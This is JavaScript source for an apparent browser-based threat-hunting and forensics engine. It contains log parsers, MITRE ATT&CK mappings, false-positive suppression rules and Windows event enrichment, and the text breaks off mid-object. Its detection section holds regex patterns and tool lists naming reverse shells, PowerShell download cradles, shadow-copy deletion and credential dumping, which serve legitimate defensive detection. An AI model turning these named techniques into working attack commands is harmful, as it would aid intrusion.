/**
 * ═══════════════════════════════════════════════════════════════════
 *  RAYKAN — AI-Powered Threat Hunting & DFIR Engine
 *  Frontend Module v2.0 — Wadjet-Eye AI Platform
 *
 *  Features:
 *   • Real-time detection stream (WebSocket)
 *   • Interactive forensic timeline
 *   • Attack-path graph visualization
 *   • RQL & natural-language threat hunting
 *   • IOC enrichment lookup panel
 *   • MITRE ATT&CK heatmap
 *   • Entity investigation workspace
 *   • Risk scoring dashboard
 *   • AI-powered rule generation
 *   • File log upload & parsing
 *   • Behavioral anomaly tracking
 *   • Attack-chain reconstruction
 *   • Forensic entity pivot graph
 *   • Export (JSON / CSV / PDF)
 *
 *  Exports: window.RAYKAN_UI = { render, hunt, ingest, investigate }
 *  js/raykan.js
 * ═══════════════════════════════════════════════════════════════════
 */

(function(window) {
  'use strict';

  // ════════════════════════════════════════════════════════════════
  //  normalizeDetections — client-side type-safe coercion to Array
  //
  //  Fixes: TypeError: (r.detections || []) is not iterable
  //
  //  The /api/raykan/ingest endpoint may return detections as:
  //    • Array<Object>  — correct (new backend)
  //    • { count, items, ... } — old nested shape
  //    • null / undefined     — no results
  //    • JSON string          — edge case
  //
  //  This function guarantees the caller always gets an iterable
  //  array of plain objects regardless of the server shape.
  // ════════════════════════════════════════════════════════════════
  function normalizeDetections(input) {
    if (input == null) return [];
    if (Array.isArray(input)) return input;

    // Old nested shape: { count, items, critical, high, medium }
    if (typeof input === 'object') {
      if (Array.isArray(input.items)) return input.items;
      if (Array.isArray(input.detections)) return input.detections;
      // Generic object → values
      const vals = Object.values(input);
      if (vals.length > 0 && typeof vals[0] === 'object') return vals;
      return [];
    }

    if (typeof input === 'string') {
      try {
        const parsed = JSON.parse(input);
        return normalizeDetections(parsed);
      } catch { return []; }
    }

    return [];
  }

  // ════════════════════════════════════════════════════════════════
  //  Client-side multi-format log parsers
  //  Used by ingestPasted() before sending to the backend so that
  //  Syslog / CEF lines become structured JSON events.
  // ════════════════════════════════════════════════════════════════

  /** Parse a single RFC 3164 / RFC 5424 syslog line → event object */
  function _parseSyslogLine(line) {
    if (!line) return { raw: line, _format: 'syslog_bare' };
    // RFC 5424: <PRI>VERSION TS HOST APP PROCID MSGID SD MSG
    const r5 = line.match(/^<(\d+)>(\d+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\[.*?\]|-)\s*(.*)$/);
    if (r5) {
      const pri = parseInt(r5[1], 10);
      return { _format:'syslog_rfc5424', priority:pri, facility:Math.floor(pri/8),
               severity_num:pri%8, timestamp:r5[3], hostname:r5[4]!=='-'?r5[4]:null,
               app_name:r5[5]!=='-'?r5[5]:null, message:r5[9]||'', raw:line };
    }
    // RFC 3164: <PRI>TIMESTAMP HOSTNAME TAG: MSG
    const r3 = line.match(/^<(\d+)>([A-Za-z]{3}\s+\d+\s+\d{2}:\d{2}:\d{2})\s+(\S+)\s+(\S+):\s*(.*)$/);
    if (r3) {
      const pri = parseInt(r3[1], 10);
      return { _format:'syslog_rfc3164', priority:pri, facility:Math.floor(pri/8),
               severity_num:pri%8, timestamp:r3[2], hostname:r3[3], tag:r3[4],
               message:r3[5]||'', raw:line };
    }
    return { _format:'syslog_bare', message:line, raw:line };
  }

  /** Parse a single CEF line → event object */
  function _parseCEFLine(line) {
    if (!line || !line.startsWith('CEF:')) return null;
    let pipes=0, headerEnd=-1;
    for (let i=0;i<line.length;i++) {
      if (line[i]==='|' && (i===0||line[i-1]!=='\\')) pipes++;
      if (pipes===7) { headerEnd=i; break; }
    }
    const headerStr = headerEnd>0 ? line.slice(0,headerEnd) : line;
    const extStr    = headerEnd>0 ? line.slice(headerEnd+1) : '';
    const parts     = headerStr.split(/(?<!\\)\|/);
    const ext = {};
    const pairs = extStr.match(/(\w+)=((?:[^=\\]|\\.)*?)(?=\s+\w+=|$)/g) || [];
    for (const p of pairs) {
      const eq=p.indexOf('=');
      if (eq>0) ext[p.slice(0,eq).trim()] = p.slice(eq+1).replace(/\\=/g,'=').trim();
    }
    return { _format:'cef', cef_version:(parts[0]||'CEF:0').replace('CEF:',''),
             device_vendor:parts[1]||'', device_product:parts[2]||'',
             signature_id:parts[4]||'', name:parts[5]||'', severity:parts[6]||'',
             extensions:ext, src:ext.src||null, dst:ext.dst||null,
             user:ext.suser||ext.duser||null, message:ext.msg||null, raw:line };
  }

  /**
   * _parseLogInput — converts raw pasted text to a JSON events array.
   * Dispatches by format hint: json | syslog | cef | auto
   */
  function _parseLogInput(raw, fmt) {
    if (!raw) return [];
    const trimmed = raw.trim();

    // JSON mode (or auto — try JSON first)
    if (fmt !== 'syslog' && fmt !== 'cef') {
      try {
        const parsed = JSON.parse(trimmed);
        if (Array.isArray(parsed))         return parsed;
        if (parsed && typeof parsed==='object') return [parsed];
      } catch { /* fall through to line-by-line */ }
    }

    // Line-by-line parsing
    return trimmed.split(/\r?\n/)
      .map(l => l.trim()).filter(Boolean)
      .map(line => {
        if (fmt==='cef'    || line.startsWith('CEF:')) return _parseCEFLine(line) || { raw:line, _format:'cef_malformed' };
        if (fmt==='syslog' || line.startsWith('<'))    return _parseSyslogLine(line);
        // Auto: try JSON, then syslog
        try { const p=JSON.parse(line); return { ...p, _format:'json', raw:line }; } catch {}
        return _parseSyslogLine(line);
      });
  }

  // ── Constants ──────────────────────────────────────────────────
  const RAYKAN_VERSION = '3.0.0';
  const API_BASE       = window.BACKEND_URL?.() || 'https://wadjet-eye-ai.onrender.com';
  const WS_BASE        = API_BASE.replace(/^http/, 'ws');

  // Severity styling
  const SEV = {
    critical     : { color:'#ef4444', bg:'rgba(239,68,68,0.12)',   badge:'#dc2626', icon:'🔴', label:'CRITICAL' },
    high         : { color:'#f97316', bg:'rgba(249,115,22,0.12)',  badge:'#ea580c', icon:'🟠', label:'HIGH'     },
    medium       : { color:'#eab308', bg:'rgba(234,179,8,0.12)',   badge:'#ca8a04', icon:'🟡', label:'MEDIUM'   },
    low          : { color:'#22c55e', bg:'rgba(34,197,94,0.12)',   badge:'#16a34a', icon:'🟢', label:'LOW'      },
    informational: { color:'#6b7280', bg:'rgba(107,114,128,0.12)', badge:'#4b5563', icon:'⚪', label:'INFO'     },
  };

  // MITRE tactic color map
  const TACTIC_COLOR = {
    'initial-access'      : '#ef4444',
    'execution'           : '#f97316',
    'persistence'         : '#eab308',
    'privilege-escalation': '#a78bfa',
    'defense-evasion'     : '#60a5fa',
    'credential-access'   : '#34d399',
    'discovery'           : '#fb923c',
    'lateral-movement'    : '#f472b6',
    'collection'          : '#38bdf8',
    'command-and-control' : '#4ade80',
    'exfiltration'        : '#c084fc',
    'impact'              : '#f87171',
  };

  // ── State ───────────────────────────────────────────────────────
  const S = {
    detections   : [],
    incidents    : [],   // correlated incident groups (parent + children)
    timeline     : [],
    chains       : [],
    anomalies    : [],
    huntResults  : null,
    stats        : null,
    activeTab    : 'overview',
    wsConnected  : false,
    analyzing    : false,
    hunting      : false,
    sessionId    : null,
    riskScore    : 0,
    lastUpdated  : null,
    huntMode     : 'rql',    // 'rql' | 'nl'
    investigateEntity: null,
    uploadedEvents: [],
  };

  // ── WebSocket ─────────────────────────────────────────────────
  let _ws = null, _wsRetries = 0;

  function _connectWS() {
    if (_ws?.readyState === WebSocket.OPEN) return;
    try {
      _ws = new WebSocket(`${WS_BASE}/socket.io/?transport=websocket`);
      _ws.onopen  = () => { S.wsConnected = true;  _wsRetries = 0; _updateWSBadge(); };
      _ws.onclose = () => {
        S.wsConnected = false; _updateWSBadge();
        if (_wsRetries < 5) setTimeout(() => { _wsRetries++; _connectWS(); }, 3000 * (_wsRetries + 1));
      };
      _ws.onmessage = (e) => {
        try {
          const msg = JSON.parse(e.data);
          if (msg.type === 'raykan:detection') _onRealtimeDetection(msg.payload);
          if (msg.type === 'raykan:anomaly')   _onRealtimeAnomaly(msg.payload);
          if (msg.type === 'raykan:chain')     _onRealtimeChain(msg.payload);
        } catch {}
      };
    } catch {}
  }

  // ── API ────────────────────────────────────────────────────────
  async function _api(method, path, body) {
    const token = window.UnifiedTokenStore?.getToken() || window.TokenStore?.getToken() || '';
    const opts  = { method, headers: { 'Content-Type':'application/json', Authorization:`Bearer ${token}` } };
    if (body) opts.body = JSON.stringify(body);
    const r = await fetch(`${API_BASE}/api/raykan${path}`, opts);
    const d = await r.json().catch(() => ({}));
    if (!r.ok) throw new Error(d.error || `API ${r.status}`);
    return d;
  }

  // ════════════════════════════════════════════════════════════════
  //  CLIENT-SIDE DETECTION ENGINE (CSDE) v3.0
  //  ─────────────────────────────────────────────────────────────
  //  Full offline analysis engine running entirely in the browser.
  //  Capabilities:
  //    • Sigma-compatible rule matching (Windows & Linux)
  //    • OS/context filtering — Windows rules never fire on Linux logs
  //    • Variant normalization — "[Variant X]" stripped before grouping
  //    • Deduplication with sliding time window (configurable, default 60 s)
  //    • Severity aggregation: highest severity among matched variants
  //    • Confidence scoring: f(event_count, variant_count, behavioral_diversity)
  //    • O(n) event pipeline via Map-based indexing (1 M+ events)
  //    • Attack-chain correlation with MITRE ATT&CK full-chain mapping
  //    • UEBA anomaly detection
  //    • Timeline with deduplicated entries + expandable raw events
  // ════════════════════════════════════════════════════════════════

  const CSDE = (function() {

    // ── Configuration ─────────────────────────────────────────────
    const CFG = {
      DEDUP_WINDOW_MS          : 60_000,    // 60-second sliding window for grouping
      IDENTICAL_TS_JITTER      : 1,         // Treat events within 1 ms as same timestamp
      MAX_EVIDENCE_STORED      : 20,        // Max raw events stored per deduplicated detection
      MIN_BRUTE_FORCE_COUNT    : 2,         // Minimum failures to trigger brute-force rule
      CHAIN_MAX_GAP_MS         : 3_600_000, // Max time between chain stages (1 hour)
      // ── Adversary-Centric Engine (ACE) configuration ──────────
      ACE_PROXIMITY_WINDOW_MS  : 3_600_000, // Cross-host stitching window (1 hour)
      ACE_PROCESS_LINEAGE_DEPTH: 5,         // Max parent-process chain depth to follow
      ACE_MIN_NODES_FOR_GRAPH  : 1,         // Min nodes to form an attack graph
      ACE_MERGE_GAP_MS         : 1_800_000, // Chain-merge gap (30 min same adversary)
      ACE_CAUSAL_EDGE_MAX_GAP  : 7_200_000, // Max causal edge time gap (2 hours)
      // ── Behavioral-Chain Engine (BCE) — v10 ───────────────────
      BCE_MIN_CHAIN_DEPTH      : 3,         // Minimum logical stages per incident
      BCE_INFER_STAGES         : true,      // Insert inferred stages when telemetry gaps exist
      BCE_INFER_CONFIDENCE_BASE: 40,        // Base confidence % for inferred stages
      BCE_PROGRESSIVE_RISK     : true,      // Scale risk by stage depth + progression
      BCE_ADAPTIVE_WINDOWS     : true,      // Use per-tactic time windows (not fixed)
    };

    // ── Adaptive time windows per tactic (ms) ─────────────────────
    // Execution happens in seconds; lateral movement can span hours
    const TACTIC_ADAPTIVE_WINDOWS = {
      'execution'           : 300_000,      // 5 minutes
      'persistence'         : 3_600_000,    // 1 hour
      'privilege-escalation': 600_000,      // 10 minutes
      'defense-evasion'     : 600_000,      // 10 minutes
      'credential-access'   : 3_600_000,    // 1 hour
      'discovery'           : 1_800_000,    // 30 minutes
      'lateral-movement'    : 7_200_000,    // 2 hours
      'collection'          : 3_600_000,    // 1 hour
      'exfiltration'        : 7_200_000,    // 2 hours
      'impact'              : 3_600_000,    // 1 hour
      'initial-access'      : 3_600_000,    // 1 hour
      'command-and-control' : 7_200_000,    // 2 hours
      'reconnaissance'      : 86_400_000,   // 24 hours
    };

    // ── Behavioral Fingerprint Map — Tool → Tactic+Technique ──────
    // Maps specific attacker tools, patterns, commands to precise ATT&CK classification
    // This overrides generic detections with precise behavioral context
    const BEHAVIORAL_FINGERPRINTS = {
      // Credential dumping tools
      'mimikatz'    : { tactic:'credential-access',   technique:'T1003.001', name:'LSASS Memory',               severity:'critical', role:'credential_access'  },
      'procdump'    : { tactic:'credential-access',   technique:'T1003.001', name:'LSASS Memory',               severity:'critical', role:'credential_access'  },
      'gsecdump'    : { tactic:'credential-access',   technique:'T1003',     name:'OS Credential Dumping',      severity:'critical', role:'credential_access'  },
      'pwdump'      : { tactic:'credential-access',   technique:'T1003',     name:'OS Credential Dumping',      severity:'critical', role:'credential_access'  },
      'fgdump'      : { tactic:'credential-access',   technique:'T1003',     name:'OS Credential Dumping',      severity:'critical', role:'credential_access'  },
      'wce'         : { tactic:'credential-access',   technique:'T1003.001', name:'LSASS Memory',               severity:'critical', role:'credential_access'  },
      // Remote access / lateral movement
      'psexec'      : { tactic:'lateral-movement',    technique:'T1021.002', name:'SMB/Windows Admin Shares',   severity:'high',     role:'lateral_movement'   },
      'wmiexec'     : { tactic:'lateral-movement',    technique:'T1047',     name:'Windows Management Instrumentation', severity:'high', role:'lateral_movement' },
      'smbexec'     : { tactic:'lateral-movement',    technique:'T1021.002', name:'SMB/Windows Admin Shares',   severity:'high',     role:'lateral_movement'   },
      'meterpreter' : { tactic:'command-and-control', technique:'T1071.001', name:'Web Protocols',              severity:'critical', role:'execution'          },
      'cobalt'      : { tactic:'command-and-control', technique:'T1071.001', name:'Web Protocols',              severity:'critical', role:'execution'          },
      'empire'      : { tactic:'execution',           technique:'T1059.001', name:'PowerShell',                 severity:'critical', role:'execution'          },
      'beacon'      : { tactic:'command-and-control', technique:'T1071.001', name:'Web Protocols',              severity:'critical', role:'execution'          },
      // Ransomware / impact
      'vssadmin'    : { tactic:'impact',              technique:'T1490',     name:'Inhibit System Recovery',    severity:'critical', role:'impact'             },
      'wbadmin'     : { tactic:'impact',              technique:'T1490',     name:'Inhibit System Recovery',    severity:'critical', role:'impact'             },
      'bcdedit'     : { tactic:'impact',              technique:'T1490',     name:'Inhibit System Recovery',    severity:'critical', role:'impact'             },
      // Defense evasion
      'wevtutil'    : { tactic:'defense-evasion',     technique:'T1070.001', name:'Clear Windows Event Logs',   severity:'high',     role:'defense_evasion'    },
      // Reconnaissance
      'nmap'        : { tactic:'reconnaissance',      technique:'T1046',     name:'Network Service Discovery',  severity:'medium',   role:'discovery'          },
      'nessus'      : { tactic:'reconnaissance',      technique:'T1046',     name:'Network Service Discovery',  severity:'low',      role:'discovery'          },
      'masscan'     : { tactic:'reconnaissance',      technique:'T1046',     name:'Network Service Discovery',  severity:'medium',   role:'discovery'          },
      // Persistence
      'schtasks'    : { tactic:'persistence',         technique:'T1053.005', name:'Scheduled Task',             severity:'high',     role:'persistence'        },
      'at.exe'      : { tactic:'persistence',         technique:'T1053.002', name:'At',                         severity:'high',     role:'persistence'        },
      // Execution
      'mshta'       : { tactic:'execution',           technique:'T1218.005', name:'Mshta',                      severity:'high',     role:'execution'          },
      'regsvr32'    : { tactic:'execution',           technique:'T1218.010', name:'Regsvr32',                   severity:'high',     role:'execution'          },
      'wscript'     : { tactic:'execution',           technique:'T1059.005', name:'Visual Basic',               severity:'high',     role:'execution'          },
      'cscript'     : { tactic:'execution',           technique:'T1059.005', name:'Visual Basic',               severity:'high',     role:'execution'          },
      'certutil'    : { tactic:'defense-evasion',     technique:'T1140',     name:'Deobfuscate/Decode Files',   severity:'high',     role:'defense_evasion'    },
      'bitsadmin'   : { tactic:'command-and-control', technique:'T1197',     name:'BITS Jobs',                  severity:'high',     role:'execution'          },
    };

    // ── Inferred stage templates per tactic ───────────────────────
    // When a mid/late-stage detection fires, infer what MUST have preceded it
    // Format: tactic → [ { tactic, technique, name, confidence, role } ]
    const INFERRED_PRECURSORS = {
      'credential-access': [
        { tactic:'initial-access',  technique:'T1078',     name:'Valid Accounts (Inferred)',        confidence:55, role:'initial_access'    },
        { tactic:'execution',       technique:'T1059.001', name:'Command Execution (Inferred)',     confidence:50, role:'execution'         },
      ],
      'lateral-movement': [
        { tactic:'initial-access',  technique:'T1078',     name:'Initial Access (Inferred)',        confidence:60, role:'initial_access'    },
        { tactic:'credential-access',technique:'T1078.002',name:'Credential Use (Inferred)',        confidence:65, role:'credential_access' },
      ],
      'impact': [
        { tactic:'initial-access',  technique:'T1190',     name:'Initial Compromise (Inferred)',   confidence:50, role:'initial_access'    },
        { tactic:'execution',       technique:'T1059',     name:'Execution Stage (Inferred)',       confidence:55, role:'execution'         },
        { tactic:'defense-evasion', technique:'T1070',     name:'Defense Evasion (Inferred)',       confidence:45, role:'defense_evasion'   },
      ],
      'privilege-escalation': [
        { tactic:'initial-access',  technique:'T1078',     name:'Initial Access (Inferred)',        confidence:55, role:'initial_access'    },
        { tactic:'execution',       technique:'T1059',     name:'Execution Stage (Inferred)',       confidence:50, role:'execution'         },
      ],
      'exfiltration': [
        { tactic:'initial-access',  technique:'T1078',     name:'Initial Access (Inferred)',        confidence:60, role:'initial_access'    },
        { tactic:'collection',      technique:'T1005',     name:'Data Collection (Inferred)',       confidence:55, role:'collection'        },
      ],
      'collection': [
        { tactic:'initial-access',  technique:'T1078',     name:'Initial Access (Inferred)',        confidence:55, role:'initial_access'    },
        { tactic:'discovery',       technique:'T1083',     name:'File Discovery (Inferred)',        confidence:50, role:'discovery'         },
      ],
    };

    // ── Progressive risk escalation weights by stage depth ────────
    // The deeper into the kill chain, the higher the risk ceiling
    const STAGE_DEPTH_RISK_MULTIPLIER = {
      'initial-access'      : 0.4,   // Early: low risk
      'execution'           : 0.55,
      'persistence'         : 0.60,
      'privilege-escalation': 0.70,
      'defense-evasion'     : 0.65,
      'credential-access'   : 0.75,
      'discovery'           : 0.60,
      'lateral-movement'    : 0.85,  // Late: high risk
      'collection'          : 0.80,
      'command-and-control' : 0.82,
      'exfiltration'        : 0.90,
      'impact'              : 1.00,  // Terminal: maximum risk
    };

    // ── Asset criticality roles (for risk amplification) ──────────
    const CRITICAL_ASSET_PATTERNS = [
      /\bDC\d*\b/i,        // Domain Controller
      /\bAD\b/i,           // Active Directory
      /\b(domain.?controller|PDC|BDC)\b/i,
      /\b(exchange|mail.?server|smtp)\b/i,
      /\b(backup|veeam|commvault)\b/i,
      /\b(file.?server|FS\d*|NAS)\b/i,
      /\b(database|SQL|oracle|mongo)\b/i,
    ];

    // ── Severity weights (higher = worse) ──────────────────────────
    const SEV_WEIGHT = { critical: 100, high: 80, medium: 50, low: 20, informational: 5 };

    // ════════════════════════════════════════════════════════════════
    //  ACE v6 — ADVERSARY-CENTRIC ENGINE CONSTANTS
    //  MITRE technique severity weights for multi-factor scoring
    //  Phase ordering for DAG causal validation
    //  Intent inference taxonomy
    // ════════════════════════════════════════════════════════════════

    // Technique severity weights (based on MITRE ATT&CK impact + rarity)
    const TECHNIQUE_SEV_WEIGHT = {
      'T1486':    30, // Data Encrypted for Impact (ransomware)
      'T1490':    28, // Inhibit System Recovery (shadow delete)
      'T1003.001':27, // LSASS Memory Dump
      'T1003':    25, // OS Credential Dumping
      'T1059.001':22, // PowerShell
      'T1059':    20, // Command & Scripting Interpreter
      'T1543.003':18, // Windows Service (persistence)
      'T1543':    16, // Create/Modify System Process
      'T1021.002':18, // SMB/Windows Admin Shares (lateral)
      'T1021':    16, // Remote Services
      'T1071.001':15, // Web Protocols (C2)
      'T1071':    14, // Application Layer Protocol
      'T1047':    16, // WMI Execution
      'T1566.001':18, // Spear Phishing Attachment
      'T1566':    16, // Phishing
      'T1110.003':14, // Password Spraying
      'T1110.001':12, // Brute Force Password Guessing
      'T1110.004':13, // Credential Stuffing
      'T1110':    12, // Brute Force
      'T1098':    20, // Account Manipulation
      'T1078':    18, // Valid Accounts (abuse)
      'T1053.005':16, // Scheduled Task
      'T1053':    14, // Scheduled Task/Job
      'T1497':    12, // Virtualization/Sandbox Evasion
      'T1562':    15, // Impair Defenses
      'T1562.002':28, // Disable Windows Event Logging (log tamper)
      'T1070':    14, // Indicator Removal
      'T1070.001':30, // Clear Windows Event Logs (log tamper — critical)
      'T1055':    20, // Process Injection
      'T1134':    18, // Access Token Manipulation
      'T1027':    12, // Obfuscated Files
      'T1190':    26, // Exploit Public-Facing Application
      'T1489':    22, // Service Stop
      'T1202':    10, // Indirect Command Execution (WSL)
      'T1059.004':18, // Unix Shell (reverse shell)
    };

    // MITRE tactic phase order (lower index = earlier in kill chain)
    const PHASE_ORDER = {
      'reconnaissance':       0,
      'resource-development': 1,
      'initial-access':       2,
      'execution':            3,
      'persistence':          4,
      'privilege-escalation': 5,
      'defense-evasion':      6,
      'credential-access':    7,
      'discovery':            8,
      'lateral-movement':     9,
      'collection':           10,
      'command-and-control':  11,
      'exfiltration':         12,
      'impact':               13,
      // aliases
      'authentication':       2,
      'network':              11,
      'file':                 10,
      'process':              3,
    };

    // Valid causal edges: A can precede B in an attack chain
    // key = source tactic, value = Set of valid successor tactics
    const VALID_CAUSAL_EDGES = {
      'initial-access':       new Set(['execution','persistence','privilege-escalation','defense-evasion','discovery','lateral-movement','credential-access']),
      'execution':            new Set(['persistence','privilege-escalation','defense-evasion','credential-access','discovery','lateral-movement','collection','command-and-control','impact']),
      'persistence':          new Set(['execution','privilege-escalation','defense-evasion','credential-access','discovery','lateral-movement','collection','command-and-control','impact']),
      'privilege-escalation': new Set(['defense-evasion','credential-access','discovery','lateral-movement','collection','command-and-control','impact','execution','persistence']),
      'defense-evasion':      new Set(['execution','persistence','privilege-escalation','credential-access','discovery','lateral-movement','collection','command-and-control','impact']),
      // credential-access CAN lead to persistence (attacker creds → create account / schedule task)
      'credential-access':    new Set(['discovery','lateral-movement','privilege-escalation','defense-evasion','collection','command-and-control','impact','execution','persistence','exfiltration']),
      'discovery':            new Set(['lateral-movement','collection','execution','credential-access','command-and-control','impact','privilege-escalation','persistence']),
      'lateral-movement':     new Set(['execution','persistence','privilege-escalation','defense-evasion','credential-access','discovery','collection','command-and-control','impact']),
      'collection':           new Set(['exfiltration','command-and-control','impact','defense-evasion']),
      'command-and-control':  new Set(['collection','exfiltration','impact','execution','lateral-movement','defense-evasion']),
      'exfiltration':         new Set(['impact','defense-evasion']),
      // impact is NOT truly terminal: ransomware often followed by log clearing (defense-evasion)
      'impact':               new Set(['defense-evasion','exfiltration']),
      // ── Authentication alias — logon failures PRECEDE successful logon / execution ──
      'authentication':       new Set(['execution','lateral-movement','privilege-escalation','discovery','credential-access','persistence','defense-evasion','collection','command-and-control','impact']),
      // ── Reconnaissance ────────────────────────────────────────────
      'reconnaissance':       new Set(['initial-access','resource-development','execution','discovery','credential-access']),
      'resource-development': new Set(['initial-access','execution','credential-access']),
    };

    // Admin vs Attacker intent signals
    const ADMIN_INTENT_SIGNALS = {
      processes: ['msiexec','wuauclt','sccm','ccmexec','wsus','veeam','acronis','commvault',
                  'backup','tanium','crowdstrike','sentinelone','cylance','sophos','symantec',
                  'malwarebytes','osquery','splunk','tenable','nessus','qualys','carbon black',
                  'cbdefense','defender','antimalware','endpoint','patch'],
      commands:  ['windows update','system center','group policy','gpo','intune','mdm',
                  'software deployment','patch tuesday','maintenance','scheduled maintenance'],
      accounts:  ['svc_','_svc','service account','sccm$','backup$','wsus$'],
      timePatterns: { maintenanceHours: [0,1,2,3,4,5], maintenanceDays: [6,0] }, // Sat/Sun
    };

    const ATTACKER_INTENT_SIGNALS = {
      processes: ['mimikatz','meterpreter','cobalt','beacon','empire','cobaltstrike',
                  'metasploit','psexec','wce','fgdump','pwdump','gsecdump','procdump',
                  'rundll32','regsvr32','wscript','cscript','mshta'],
      commandPatterns: [
        /invoke-expression|iex\s*\(/i,
        /downloadstring|downloadfile|webclient/i,
        /-encodedcommand|-enc\s+[A-Za-z0-9+/]{20}/i,
        /bypass.*executionpolicy|executionpolicy.*bypass/i,
        /sekurlsa|lsadump|kerberoast|asreproast/i,
        /vssadmin.*delete.*shadows|wmic.*shadowcopy.*delete/i,
        /net\s+user.*\/add|net\s+localgroup.*\/add/i,
        /certutil.*-decode|-urlcache.*-split/i,
        /\/dev\/tcp\/|bash.*-i|nc\s+-e|ncat\s+-e/i,
        /procdump.*lsass|lsass.*procdump/i,
      ],
      networkIndicators: {
        suspiciousPorts: [4444,4445,5555,6666,7777,8888,9999,1234,31337,12345],
        suspiciousProcs: ['cmd.exe','powershell.exe','wscript.exe','cscript.exe','mshta.exe','rundll32.exe','regsvr32.exe'],
      },
    };

    // ════════════════════════════════════════════════════════════════
    //  SOC v5 — FALSE-POSITIVE SUPPRESSION REGISTRY
    //  Known-safe programs, backup/patching/admin tools, and common
    //  maintenance patterns that should NOT trigger detections.
    //  Each entry: { pattern, type, reason }
    // ════════════════════════════════════════════════════════════════
    const FP_SUPPRESS = {
      // Known admin / backup / patch management tools
      processes: [
        { pat: 'veeam',           reason: 'Veeam backup agent' },
        { pat: 'backup',          reason: 'Backup software process' },
        { pat: 'acronis',         reason: 'Acronis backup' },
        { pat: 'commvault',       reason: 'CommVault backup' },
        { pat: 'wsus',            reason: 'Windows Update Services' },
        { pat: 'wuauclt',         reason: 'Windows Update client' },
        { pat: 'musnotify',       reason: 'Windows Update notification' },
        { pat: 'sccm',            reason: 'SCCM/MECM client' },
        { pat: 'ccmexec',         reason: 'SCCM exec agent' },
        { pat: 'msiexec',         reason: 'Windows Installer (MSI)' },
        { pat: 'installshield',   reason: 'InstallShield setup' },
        { pat: 'osquery',         reason: 'osquery EDR agent' },
        { pat: 'crowdstrike',     reason: 'CrowdStrike Falcon sensor' },
        { pat: 'cylance',         reason: 'Cylance AV agent' },
        { pat: 'sentinelone',     reason: 'SentinelOne agent' },
        { pat: 'symantec',        reason: 'Symantec AV' },
        { pat: 'sophos',          reason: 'Sophos AV' },
        { pat: 'malwarebytes',    reason: 'MalwareBytes scanner' },
        { pat: 'tanium',          reason: 'Tanium endpoint agent' },
        { pat: 'splunk',          reason: 'Splunk forwarder' },
      ],
      // Safe shadow-copy/vssadmin operations (done by backup software)
      safeVssPatterns: [
        'veeam', 'backup exec', 'acronis', 'commvault', 'ntbackup',
        'wbadmin', 'dpm', 'system center',
      ],
      // Maintenance window hours: 02:00–05:00 UTC daily (configurable)
      maintenanceWindowHours: [2, 3, 4],

      // PowerShell scripts known-safe by path
      safePsPathPrefixes: [
        'c:\\program files\\microsoft\\', 'c:\\program files (x86)\\',
        'c:\\windows\\system32\\', 'c:\\windows\\syswow64\\',
        'c:\\programdata\\microsoft\\windows defender\\',
      ],
    };

    // ── FP suppression check: returns {suppressed, reason} ─────────
    function _checkFPSuppression(event, ruleId) {
      const proc    = (event.process || event.commandLine || '').toLowerCase();
      const cmdLine = (event.commandLine || '').toLowerCase();
      const ts      = event.timestamp ? new Date(event.timestamp) : null;

      // 1. Known-safe process patterns
      for (const fp of FP_SUPPRESS.processes) {
        if (proc.includes(fp.pat) || cmdLine.includes(fp.pat)) {
          return { suppressed: true, reason: `FP: ${fp.reason}` };
        }
      }

      // 2. Shadow Copy deletion — allow if initiated by known backup tool
      if (ruleId === 'CSDE-WIN-013') {
        const isSafeVss = FP_SUPPRESS.safeVssPatterns.some(p =>
          proc.includes(p) || cmdLine.includes(p) ||
          (event.parentProcess || '').toLowerCase().includes(p)
        );
        if (isSafeVss) return { suppressed: true, reason: 'FP: VSS deletion by known backup software' };
      }

      // 3. Maintenance window: suppress informational/low events only
      if (ts && !isNaN(ts.getTime())) {
        const h = ts.getUTCHours();
        if (FP_SUPPRESS.maintenanceWindowHours.includes(h)) {
          // Only suppress low-severity in maintenance window
          // High/critical still fire
          return { inMaintenanceWindow: true };
        }
      }

      return { suppressed: false };
    }

    // ════════════════════════════════════════════════════════════════
    //  SOC v5 — EVENTID ENRICHMENT DICTIONARY
    //  Maps numeric Windows EventIDs and known patterns to
    //  analyst-readable descriptions, field extractors, and context.
    // ════════════════════════════════════════════════════════════════
    const EVENT_ENRICHMENT = {
      // Windows Security
      4624: { label: 'Successful Logon',         category: 'authentication',  icon: '🔓',
               extract: e => `User "${e.user}" logged on (Type ${e.LogonType||'?'}) from ${e.srcIp||'local'}` },
      4625: { label: 'Failed Logon',             category: 'authentication',  icon: '🔐',
               extract: e => `FAILED logon for "${e.user}" from ${e.srcIp||'local'} — Status: ${e.Status||e.SubStatus||'FAILURE'}` },
      4634: { label: 'Logoff',                   category: 'authentication',  icon: '🚪',
               extract: e => `User "${e.user}" logged off (Type ${e.LogonType||'?'})` },
      4648: { label: 'Explicit Credential Logon',category: 'authentication',  icon: '🔑',
               extract: e => `Explicit credentials used by "${e.user}" to access ${e.TargetServerName||'unknown'}` },
      4688: { label: 'Process Created',          category: 'process',         icon: '⚙️',
               extract: e => `Process "${e.process||'?'}" created by "${e.user}" — CMD: "${(e.commandLine||'').slice(0,200)}"` },
      4698: { label: 'Scheduled Task Created',   category: 'persistence',     icon: '🗓️',
               extract: e => `Task "${e.TaskName||'?'}" created by "${e.user}" — Action: "${e.TaskContent||'?'}"` },
      4702: { label: 'Scheduled Task Updated',   category: 'persistence',     icon: '🗓️',
               extract: e => `Task "${e.TaskName||'?'}" modified by "${e.user}"` },
      4720: { label: 'Account Created',          category: 'persistence',     icon: '👤',
               extract: e => `New account "${e.TargetUserName||'?'}" created by "${e.user}"` },
      4728: { label: 'Member Added to Group',    category: 'privilege-escalation', icon: '👥',
               extract: e => `"${e.MemberName||'?'}" added to "${e.TargetUserName||'?'}" group by "${e.user}"` },
      4732: { label: 'Member Added to Local Group', category: 'privilege-escalation', icon: '👥',
               extract: e => `"${e.MemberName||'?'}" added to local group "${e.TargetUserName||'?'}" by "${e.user}"` },
      5140: { label: 'Network Share Accessed',   category: 'lateral-movement',icon: '📁',
               extract: e => `Share "${e.ShareName||'?'}" accessed by "${e.user}" from ${e.srcIp||'?'}` },
      5145: { label: 'Network Share Object Checked', category: 'lateral-movement', icon: '📂',
               extract: e => `Object "${e.RelativeTargetName||'?'}" in share "${e.ShareName||'?'}" checked by "${e.user}"` },
      5156: { label: 'Network Connection Permitted', category: 'network',     icon: '🌐',
               extract: e => `Process "${e.process||e.Application||'?'}" → ${e.destIp||'?'}:${e.destPort||'?'} (${e.Protocol==='6'?'TCP':e.Protocol==='17'?'UDP':e.Protocol||'?'})` },
